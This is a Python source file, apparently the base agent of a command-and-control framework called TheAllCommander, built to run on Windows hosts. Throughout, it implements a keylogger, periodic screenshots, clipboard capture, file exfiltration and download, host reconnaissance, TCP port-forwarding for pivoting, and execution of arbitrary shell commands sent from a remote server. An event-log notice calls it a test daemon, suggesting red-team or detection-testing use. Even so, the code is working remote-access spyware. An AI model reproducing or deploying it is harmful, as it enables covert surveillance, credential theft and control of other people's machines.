import os
import sys
import base64
import http.client
import json
import getpass
import ssl
import time
import subprocess
from pathlib import Path
import socket
import random
import string
import keyboard
from threading import Timer
from datetime import datetime

import pyautogui
from io import BytesIO
from PIL import Image

import win32clipboard

import threading
from threading import Thread

import win32api
import win32con
import win32evtlog
import win32security
import win32evtlogutil

class PortForwardOutboundLoop(Thread):
	def __init__(self, daemon, targetHost, targetPort, remoteSocket, socketLock):
		# Call the Thread class's init function
		Thread.__init__(self)
		self.daemon = daemon
		self.targetHost = targetHost
		self.targetPort = targetPort
		self.remoteSocket = remoteSocket
		self.stayAlive = True;
		self.socketLock = socketLock

	def kill(self):
		self.stayAlive = False;

	def run(self):
		while self.stayAlive:
			forwardData = self.daemon.pollForward(self.targetHost + ":" + str(self.targetPort))
			if forwardData:
				try:
					self.socketLock.acquire()
					self.remoteSocket.send(forwardData)
				except Exception as e:
					print("Cannot connect {}".format(e), file=sys.stderr)
				self.socketLock.release()    
			time.sleep(0.001)    

	def updateSocket(self, newSocket):
		self.remoteSocket = newSocket

class PortForwardInboundLoop(Thread):
	def __init__(self, daemon, targetHost, targetPort, remoteSocket, socketLock, outboundLoop):
		# Call the Thread class's init function
		Thread.__init__(self)
		self.daemon = daemon
		self.targetHost = targetHost
		self.targetPort = targetPort
		self.remoteSocket = remoteSocket
		self.stayAlive = True;
		self.socketLock = socketLock
		self.outboundLoop = outboundLoop

	def kill(self):
		self.stayAlive = False;

	def run(self):
		while self.stayAlive:
			# we set a 2 second timeout; depending on your
			# target, this may need to be adjusted
			self.remoteSocket.settimeout(2)
			dummy = 0
			try:
				# keep reading into the buffer until
				# there's no more data or we timeout

				data = self.remoteSocket.recv(4096)
				if data:
					print(base64.b64encode(data).decode('ascii'))                
					self.daemon.pushForward(self.targetHost + ":" + str(self.targetPort), data)
			except socket.timeout as e:
				dummy=1
			except Exception as e:
				print("Cannot connect {}".format(e), file=sys.stderr)
				reconnected = False;
				self.socketLock.acquire()
				while not reconnected: 
					try:
						print("Trying socket")
						remoteSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
						remoteSocket.connect((self.targetHost, self.targetPort))
						reconnected = True
						print("Update socket")                        
						self.remoteSocket = remoteSocket
						print("Other looper")                        
						self.outboundLoop.updateSocket(remoteSocket)
						print("Success?")                        
					except Exception as e:    
						print("Cannot connect {}".format(e), file=sys.stderr)        
				print("Releasing")
				self.socketLock.release()        
				print("Released")                

class Keylogger:
	def __init__(self, interval, daemon, useScreenshot):
		# we gonna pass SEND_REPORT_EVERY to interval
		self.interval = interval
		# this is the string variable that contains the log of all 
		# the keystrokes within `self.interval`
		self.log = ""
		# record start & end datetimes
		self.start_dt = datetime.now()
		self.end_dt = datetime.now()
		self.daemon = daemon
		self.useScreenshot = useScreenshot

	def callback(self, event):
		"""
		This callback is invoked whenever a keyboard event is occured
		(i.e when a key is released in this example)
		"""
		name = event.name
		if len(name) > 1:
			# not a character, special key (e.g ctrl, alt, etc.)
			# uppercase with []
			if name == "space":
				# " " instead of "space"
				name = " "
			elif name == "enter":
				# add a new line whenever an ENTER is pressed
				name = "[ENTER]\n"
			elif name == "decimal":
				name = "."
			else:
				# replace spaces with underscores
				name = name.replace(" ", "_")
				name = f"[{name.upper()}]"
		# finally, add the key name to our global `self.log` variable
		self.log += name

	def report(self):
		"""
		This function gets called every `self.interval`
		It basically sends keylogs and resets `self.log` variable
		"""
		if self.log:
			# if there is something in log, report it
			self.end_dt = datetime.now()
			# update `self.filename`
			self.daemon.postKeylogger(self.log)
			# if you want to print in the console, uncomment below line
			# print(f"[{self.filename}] - {self.log}")
			self.start_dt = datetime.now()
		self.log = ""
		if self.useScreenshot:
			self.daemon.takeScreenshot(False)
		timer = Timer(interval=self.interval, function=self.report)
		# set the thread as daemon (dies when main thread die)
		timer.daemon = True
		# start the timer
		timer.start()

	def start(self):
		# record the start datetime
		self.start_dt = datetime.now()
		# start the keylogger
		keyboard.on_release(callback=self.callback)
		# start reporting the keylogs
		self.report()

class LocalAgent:
	def __init__(self):
		self.daemonUID = self.makeUID();

	def makeUID(self):
		letters = string.ascii_letters
		return ''.join(random.choice(letters) for i in range(16))

	outboundLooperDict = {}
	inboundLooperDict = {}

	def takeScreenshot(self, postScreenshot):
		image = pyautogui.screenshot()
		im_file = BytesIO()
		image.save(im_file, format="JPEG")
		im_bytes = im_file.getvalue()  # im_bytes: image in binary format.
		im_b64 = base64.b64encode(im_bytes).decode('ascii')
		self.postScreenshot(im_b64)
		if postScreenshot:
			self.postResponse("Screenshot successful")
        
	def buildCatContent(self):
		continueBuilding = True
		content = ""
		while continueBuilding:
			command = self.pollCommand()
			if command == None:
				sleep_int = 1 + (random.randint(1,500) / 1000)
				time.sleep(sleep_int)
			elif command == '<done>':
				continueBuilding = False
			elif command == '<cancel>':
				return ""
			else:
				#Why write a \n character instead of os.linesep? b/c python
                #tried to be helpful and autocorrects your os.linesep to \r\r\n on
                #windows when writing a text file. So helpful...
				content = content + command + '\n'
		return content

	def readFile(self, filename, lineNums):
		try:
			file = open(filename, 'r')
			lines = file.readlines()
			count = 0
			content = ""
			for line in lines:
				count += 1
				if lineNums:
					content = content + str(count) + ": "
				content = content + line + "\n"
			self.postResponse(content)
			file.close()
		except:
			self.postResponse("Invalid cat directive")

	def postHarvest(self, cmd_output, harvestType):
		raise NotImplementedError("Please Implement this method")
        
	def postScreenshot(self, cmd_output):
		raise NotImplementedError("Please Implement this method")

	def postKeylogger(self, log):
		raise NotImplementedError("Please Implement this method")

	def postResponse(self, cmd_output):
		raise NotImplementedError("Please Implement this method")

	def pollServer(self):
		raise NotImplementedError("Please Implement this method") 

	def pollForward(self, forwardID):
		raise NotImplementedError("Please Implement this method") 

	def pushForward(self, forwardID, data):
		raise NotImplementedError("Please Implement this method") 

	def processNewForwardRequest(self, request):
		elements = request.split(" ")
		if(len(elements) != 4):
			return "Invalid argument: need 'proxy <ip> <remote port> <forward port>'"

		try:
			port = int(elements[2])
			remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			remote_socket.connect((elements[1], port))   
			uidStr = elements[1] + ":" + elements[2]
			socketLock = threading.Lock()
			self.outboundLooperDict[uidStr] = PortForwardOutboundLoop(self, elements[1], port, remote_socket, socketLock)
			self.outboundLooperDict.get(uidStr).start()
			self.inboundLooperDict[uidStr] = PortForwardInboundLoop(self, elements[1], port, remote_socket, socketLock, self.outboundLooperDict.get(uidStr))
			self.inboundLooperDict.get(uidStr).start()
		except Exception as e:
			print("Cannot connect {}".format(e), file=sys.stderr)
			self.postResponse("Cannot connect to specified host")    
		self.postResponse("Proxy established")    
		return None
        
	def processProxyConfirm(self, response):    
		elements = response.split(" ")
		if elements[1] in self.outboundLooperDict:
			self.postResponse("yes")
		else:
			self.postResponse("no")

	def processForwardRemove(self, request):
		elements = request.split(" ")
		if(len(elements) != 3):
			self.postResponse("Invalid argument: need 'killproxy <ip> <port>'")
		uidStr = elements[1] + ":" + elements[2]    
		if uidStr in self.outboundLooperDict:
			self.outboundLooperDict.get(uidStr).kill()
			del self.outboundLooperDict[uidStr]
		if uidStr in self.inboundLooperDict:
			self.inboundLooperDict.get(uidStr).kill()
			del self.inboundLooperDict[uidStr]
		self.postResponse("proxy terminated")    

	def pollCommand(self):
		response = self.pollServer()
		if response == '<control> No Command':
			return None
		elif response.startswith("<control> download "):
			#hexString = response[len("<control> download "):]
			#binary = base64.decodebytes(hexString.encode('ascii'))
			#f = open(".\\received", 'wb+')
			#f.write(binary)
			#f.close()
			ctrl, cmd, localname, data = response.split(" ")
			binary = base64.decodebytes(data.encode('ascii'))
			f = open(".\\" + localname, 'wb+')
			f.write(binary)
			f.close()
			self.postResponse("File written: " + localname)
			return None
		elif response.startswith("uplink "):
			filename = response[len("uplink "):]
			try:
				file = open(filename, 'rb')
				file_read = file.read() 
				file.close()
				self.postResponse("<control> uplinked " + os.path.basename(file.name) + " " + base64.encodebytes(file_read).decode('ascii').replace("\n", ""))
			except:
				self.postResponse("Invalid uplink directive")
			return None
		elif response.startswith("getuid"):
			username = getpass.getuser()
			homedir = str(Path.home())
			hostname = socket.gethostname()
			response_str = "Username: " + username + "\n"
			response_str = response_str + "Home Directory: " + homedir + "\n"
			response_str = response_str + "Hostname: " + hostname + "\n"
			self.postResponse(response_str)
			return None
		elif response.startswith("ps"):
			return "tasklist"
		elif response.startswith("proxy"):
			return self.processNewForwardRequest(response)
		elif response.startswith("killproxy"):
			return self.processForwardRemove(response)
		elif response.startswith("cd "):
			relative = response[len("cd "):]
			try:
				os.chdir(os.path.join(os.path.abspath(os.getcwd()), relative))
			except:
				self.postResponse("Invalid directory traversal")
			self.postResponse(os.getcwd())
			return None
		elif response == 'pwd':
			self.postResponse(os.getcwd())
			return None
		elif response == 'die':
			raise Exception('time to die')
		elif response == 'clipboard':
			try:
				win32clipboard.OpenClipboard()
				data = win32clipboard.GetClipboardData()
				win32clipboard.CloseClipboard()
				self.postHarvest(data, "Clipboard")
				self.postResponse("Clipboard captured")
			except Exception as e:
				print("Oops, something went wrong: {}".format(e), file=sys.stderr)
			return None
		elif response == 'screenshot':
			try:
				self.takeScreenshot(True)
			except Exception as e:
				print("Oops, something went wrong: {}".format(e), file=sys.stderr)            
			return None
		elif response.startswith('confirm_client_proxy'):
			self.processProxyConfirm(response)
		elif response.startswith('cat'):            
			elements = response.split(" ")  
			if len(elements) == 2:
				if elements[1].startswith('>>'):
					newContent = self.buildCatContent()
					if newContent != '':
						with open(elements[1][len(">>"):], 'a') as f:
							f.write(newContent)          
						self.postResponse("Data written")    
					else:
						self.postResponse("Abort: No file write")
				elif elements[1].startswith('>'):
					newContent = self.buildCatContent()
					if newContent != '':
						with open(elements[1][len(">"):], 'w') as f:
							f.write(newContent)
						self.postResponse("Data written")
					else:
						self.postResponse("Abort: No file write")                        
				else:               
					self.readFile(elements[1], False)
			elif len(elements) == 3:
				if elements[1] != '-n':
					self.postResponse("No valid cat interpretation")            
				else:
					self.readFile(elements[2], True)
			elif len(elements) == 4:
				if elements[2] == '>':
					try:
						file = open(elements[1], 'rb')
						file_read = file.read() 
						file.close()
						f = open(elements[3], 'wb')
						f.write(file_read)
						f.close()
						self.postResponse("File write executed")                            
					except:
						self.postResponse("Invalid cat directive")                
				elif elements[2] == '>>':
					try:
						file = open(elements[1], 'rb')
						file_read = file.read() 
						file.close()
						with open(elements[3], 'ab') as f:
							f.write(file_read)
						self.postResponse("Appended file")
					except Exception as e:
						#print("Oops, something went wrong: {}".format(e), file=sys.stderr)
						self.postResponse("Invalid cat directive")                
				else:
					self.postResponse("No valid cat interpretation")                
			else:
				self.postResponse("No valid cat interpretation")            
			return None                
		else:
			return response

	def postWindowsEventLogWarning(self):
		ph = win32api.GetCurrentProcess()
		th = win32security.OpenProcessToken(ph, win32con.TOKEN_READ)
		my_sid = win32security.GetTokenInformation(th, win32security.TokenUser)[0]
		applicationName = "TheAllCommander Python Daemon"
		eventID = 1
		category = 5	# Shell
		myType = win32evtlog.EVENTLOG_WARNING_TYPE
		descr = ["Testing In Progress", "TheAllCommander is executing a daemon test on your system. If you did not expect this test, please investigate this incident."]
		data = "TheAllCommander is executing a daemon test on your system. If you did not expect this test, please investigate this incident.".encode("ascii")
		win32evtlogutil.ReportEvent(applicationName, eventID, eventCategory=category, 
		eventType=myType, strings=descr, data=data, sid=my_sid)

	def run(self, newLineAfterCmdOutput = False, autoScreenshot = True):
		self.postWindowsEventLogWarning()
		self.newLineAfterCmdOutput = newLineAfterCmdOutput
		live = True
		logger = Keylogger(60, self, autoScreenshot)
		logger.start()
		while(live):
			try:
				command = self.pollCommand()
				if command != None:
					cmd_output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE).stdout.read().decode("utf-8") 
					if self.newLineAfterCmdOutput:
						cmd_output = cmd_output + "\n"
					self.postResponse(cmd_output)
				else:
					sleep_int = 1 + (random.randint(1,500) / 1000)
					time.sleep(sleep_int)
			except Exception as e:
				live = False
				print("Shutting down {}".format(e), file=sys.stderr)
